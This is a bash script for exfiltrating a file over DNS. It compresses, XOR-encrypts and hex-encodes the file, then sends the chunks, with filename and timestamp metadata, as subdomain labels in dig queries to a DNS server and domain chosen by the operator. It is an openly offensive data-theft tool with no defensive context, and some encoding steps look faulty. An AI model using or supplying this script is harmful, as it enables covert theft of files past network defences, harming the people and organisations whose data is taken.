#!/bin/bash

function show_help {
    echo "Usage: $0 -f <file_path> -p <password> [-d <domain>] [-s <dns_server_ip>]  [-t]"
    echo "Exfiltrates a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries."
    echo ""
    echo "Parameters:"
    echo "  -f   Path to the file you want to exfiltrate."
    echo "  -p   Password to be used in XOR encryption."
    echo "  -d   Domain to use in DNS queries."
    echo "  -s   IP address of the DNS server."
    echo "  -t   Optional flag to use TCP instead of UDP."
    echo ""
    echo "Example:"
    echo "  $0 -f /path/to/your/file -d example.com -s 8.8.8.8 -p securepass -t"
}

# Parse parameters
USE_TCP=0
while getopts "f:d:s:p:t" opt; do
    case $opt in
        f) FILE_PATH=$OPTARG ;;
        d) DOMAIN=$OPTARG ;;
        s) DNS_SERVER_IP=$OPTARG ;;
        p) PASSWORD=$OPTARG ;;
        t) USE_TCP=1 ;;
        *) show_help; exit 1 ;;
    esac
done

# Check if all required parameters are provided
if [ -z "$FILE_PATH" ] || [ -z "$PASSWORD" ]; then
    show_help
    exit 1
fi

# Check if file exists
if [ ! -f "$FILE_PATH" ]; then
    echo "File not found: $FILE_PATH"
    exit 1
fi

# XOR encryption function
function xor_encrypt {
    local data=("$@")
    local encrypted=()
    local password_bytes=($(echo -n "$PASSWORD" | od -An -t u1))
    local pass_len=${#password_bytes[@]}

    for i in "${!data[@]}"; do
        encrypted+=($(( data[i] ^ password_bytes[i % pass_len] )))
    done

    echo "${encrypted[@]}"
}

# Read file content as bytes
file_bytes=($(od -An -t u1 -v "$FILE_PATH"))

# Get filename and timestamp
filename=$(basename "$FILE_PATH")
timestamp=$(date +"%Y%m%d%H%M%S")

# Compress data using gzip
compressed_data=$(echo -n "${file_bytes[@]}" | gzip -c | od -An -t u1 -v)

# XOR encrypt compressed data with password
encrypted_data=($(xor_encrypt "${compressed_data[@]}"))

# Convert encrypted data to hexadecimal string
hex_encrypted_data=$(printf "%02X" "${encrypted_data[@]}")

# Maximum DNS query size constraints
label_max_size=63
request_max_size=255

# Calculate space required for domain name and metadata
domain_name_length=${#DOMAIN}+3
metadata_length=$(((${#filename} + ${#timestamp} + 6) * 2))

# Calculate maximum bytes available for data in each DNS query
bytes_left=$((request_max_size - metadata_length - domain_name_length))

# Calculate number of chunks
nb_chunks=$(((${#hex_encrypted_data} + bytes_left - 1) / bytes_left))

echo "[+] Maximum data exfiltrated per DNS request (chunk max size): [$bytes_left] bytes"
echo "[+] Number of chunks: [$nb_chunks]"

# Split encrypted data into chunks and send DNS queries
chunk_id=0
start_index=0

while [ $chunk_id -lt $nb_chunks ]; do
    end_index=$((start_index + bytes_left))
    chunk=${hex_encrypted_data:start_index:end_index-start_index}

    # Split chunk into 4 equal parts
    chunk_length=$(((end_index - start_index + 3) / 4))
    chunks=()

    for i in {0..3}; do
        start=$((i * chunk_length))
        length=$chunk_length
        [ $start -ge ${#chunk} ] && break
        [ $((start + length)) -gt ${#chunk} ] && length=$((${#chunk} - start))
        chunks+=("${chunk:start:length}")
    done

    # Construct DNS query
    encrypted_filename=($(xor_encrypt "${filename}"))
    hex_filename=$(printf "%02X" "${encrypted_filename[@]}")

    metadata="${hex_filename}|${timestamp}|${nb_chunks}"
    subdomain="${chunk_id}.${chunks[0]}.${chunks[1]}.${chunks[2]}.${chunks[3]}.${metadata}.${DOMAIN}"

    # Send DNS query using dig
    if [ $USE_TCP -eq 1 ]; then
        dig @$DNS_SERVER_IP +tcp +short "$subdomain" A
    else
        dig @$DNS_SERVER_IP +short "$subdomain" A
    fi

    # Move to next chunk
    chunk_id=$((chunk_id + 1))
    start_index=$end_index
done
